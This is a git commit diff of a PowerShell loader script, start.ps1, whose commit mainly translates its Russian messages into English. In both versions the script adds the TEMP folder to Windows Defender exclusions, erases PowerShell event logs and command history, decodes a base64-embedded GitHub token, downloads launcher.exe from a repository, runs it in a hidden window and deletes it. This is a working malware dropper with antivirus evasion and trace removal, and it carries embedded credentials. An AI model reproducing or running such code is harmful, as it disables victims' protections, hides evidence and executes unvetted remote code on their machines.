7f5f5e05466a0da5f48769ca72ab4bd18e670605
xsdementevx <xsdementevx@gmail.com>
2025-01-16 20:57:00 +0700

    Update start.ps1

--- start.ps1
+++ start.ps1
@@ -1,38 +1,24 @@
-﻿
-# Проверка на запуск от имени администратора
-function Test-Admin {
-    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-    if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Write-Host "Запустите PowerShell от имени администратора." -ForegroundColor Red
-        exit
-    }
-}
-
-# Функция очистки истории PowerShell
 function ClrHistory {
     try {
-        Write-Host "УДАЛЕНИЕ ЛОГОВ..." -ForegroundColor Green
+        Write-Host "Clear log" -ForegroundColor Green
         Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
         Remove-Item ($env:AppData + '\Microsoft\Windows\PowerShell') -Recurse -Force -ErrorAction Stop
         Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction Stop
     } catch {
-        Write-Host "Ошибка очистки истории." -ForegroundColor Red
+        Write-Host "Error clear history." -ForegroundColor Red
+		Start-Sleep -s 1
     }
 }
 
-# Функция добавления папки TEMP в исключения антивируса
 function AddToDefenderExclusions {
     try {
         $tempPath = $env:TEMP
         Add-MpPreference -ExclusionPath $tempPath -ErrorAction Stop
-        Write-Host "Папка TEMP успешно добавлена в исключения." -ForegroundColor Green
     } catch {
-        Write-Host "Ошибка при добавлении папки TEMP в исключения. Убедитесь, что PowerShell запущен от имени администратора." -ForegroundColor Red
+		Write-Host "Error DefenderExclusions" -ForegroundColor Red
+		Start-Sleep -s 1
     }
 }
-
-# Основной скрипт
-Test-Admin
 
 AddToDefenderExclusions
 
@@ -42,57 +28,49 @@ try {
     wevtutil cl "Microsoft-Windows-PowerShell/Operational"
     Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
 } catch {
-    Write-Host "Ошибка очистки логов. Возможно вы открыли PowerShell не от имени администратора." -ForegroundColor Red
+    Write-Host "Error clean log, please restart for Administrator" -ForegroundColor Red
+	Start-Sleep -s 3
     exit
 }
 
 $temp = $env:TEMP
 
 try {
-    Write-Host "ЗАПУСК..." -ForegroundColor Green
+    Write-Host "Download..." -ForegroundColor Green
     $contFile = [System.IO.Path]::GetTempFileName()
 
     try {
-		# Указываем закодированную строку вручную
-		$EncodedString = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMFRjOE1EWmNUYW85Vl9iQmNLSHhVejhCdEszdFI1cGVuaDlXT3cwQVVKaktNNEtIUVBNREZwQ3pWTkJPTkVUNFQ4YzBpSGpXcg=="
-
-		# Декодируем строку из переменной
-		$DecodedString = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedString))
-
+		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGRZWjNVeTJtWnNxTl9PWVVNWVdkcGdTWHJybk43V3pDbjIwbkVlUm5zRTVvYVVQWlJSclpsd3hWQ1hHNktGNlFOR2p0aWhMdw=="
+		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
 		$q = '"'
-        # Убедитесь, что заголовки заданы корректно
-        $headers = @{"Authorization" = "$DecodedString"}
-
-        # Выполнение запроса
-        $response = Invoke-RestMethod 'https://api.github.com/repos/xsdementevx/launcher/contents/launcher.exe' -Method 'GET' -Headers $headers
-
+        $h = @{"Authorization" = "$String"}
+        $response = Invoke-RestMethod 'https://api.github.com/repos/xsdementevx/launcher/contents/launcher.exe' -Method 'GET' -Headers $h
         if ($response.content) {
             try {
                 $cleanedContent = $response.content -replace "`n", "" -replace "`r", ""
                 $decodedContent = [System.Convert]::FromBase64String($cleanedContent)
                 [System.IO.File]::WriteAllBytes($contFile, $decodedContent)
-
-                Write-Host "Файл успешно сохранен: $contFile" -ForegroundColor Green
             } catch {
-                Write-Host "Ошибка декодирования или записи файла: $($_.Exception.Message)" -ForegroundColor Red
+				Write-Host "Error Download, not content." -ForegroundColor Red
+				Start-Sleep -s 3
                 exit
             }
         } else {
-            Write-Host "Ошибка: файл не найден или отсутствует доступ." -ForegroundColor Red
-            
+            Write-Host "Error, not file exists" -ForegroundColor Red
+            Start-Sleep -s 3
         }
     } catch {
-        Write-Host "Ошибка во время установки необходимых компонентов. Проверьте токен или запустите от имени администратора." -ForegroundColor Red
-        
+        Write-Host "Download and start not sucessed" -ForegroundColor Red
+        Start-Sleep -s 3
     }
 
     try {
-        # Запуск скачанного файла и удаление после выполнения
         $q = '"'
         $arg = "$q$contFile$q"
         Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b /wait cmd /c $arg && del $arg" -WindowStyle Hidden
     } catch {
-        Write-Host "Ошибка во время выполнения скачанного файла. Попробуйте запустить от имени администратора." -ForegroundColor Red
+        Write-Host "Error Start-Process, please restart for Administrator" -ForegroundColor Red
+		Start-Sleep -s 3
     }
 } finally {
     ClrHistory
